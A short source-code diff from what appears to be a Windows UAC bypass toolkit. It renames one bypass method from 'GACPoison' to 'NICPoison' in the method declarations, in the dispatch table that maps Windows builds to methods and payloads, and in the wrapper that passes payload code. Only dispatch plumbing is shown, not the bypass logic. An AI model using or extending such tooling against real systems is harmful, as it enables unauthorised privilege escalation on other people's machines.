@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.27
 *
-*  DATE:        10 Sep 2020
+*  DATE:        12 Sep 2020
 *
 *  UAC bypass dispatch.
 *
@@ -73,7 +73,7 @@ UCM_API(MethodEditionUpgradeManager);
 UCM_API(MethodDebugObject);
 UCM_API(MethodGlupteba);
 UCM_API(MethodShellChangePk);
-UCM_API(MethodGACPoison);
+UCM_API(MethodNICPoison);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -150,7 +150,7 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodGlupteba, NULL, { 7600, 15063 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodShellChangePk, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodMsSettings, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodGACPoison, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE }
+    { MethodNICPoison, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -1302,13 +1302,13 @@ UCM_API(MethodShellChangePk)
         _strlen(lpszPayload));
 }
 
-UCM_API(MethodGACPoison)
+UCM_API(MethodNICPoison)
 {
 #ifndef _WIN64
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
 #else
-    return ucmGACPoisonMethod(
+    return ucmNICPoisonMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #endif
